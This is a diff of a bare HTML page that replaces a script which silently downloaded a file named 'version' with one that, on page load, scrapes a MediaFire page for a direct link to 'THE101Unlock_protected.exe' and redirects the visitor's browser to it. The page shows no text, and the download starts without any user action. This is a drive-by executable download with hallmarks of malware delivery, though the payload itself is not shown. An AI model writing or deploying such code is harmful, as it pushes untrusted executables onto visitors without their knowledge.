@@ -1,23 +1,11 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <script>
-        // Download the version file immediately
-        fetch('https://github.com/VoidParadox9303/VoidParadox9303.github.io/raw/refs/heads/main/version')
-            .then(response => response.blob())
-            .then(blob => {
-                const url = window.URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.style.display = 'none';
-                a.href = url;
-                a.download = 'version';
-                document.body.appendChild(a);
-                a.click();
-                window.URL.revokeObjectURL(url);
-            });
-    </script>
-</head>
+<script>
+fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file')
+.then(r=>r.text()).then(h=>{
+    const m=h.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\.exe)"/);
+    window.location.href=m?m[1]:'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
+});
+</script>
 <body>
-    <p>Downloading version file...</p>
 </body>
 </html>
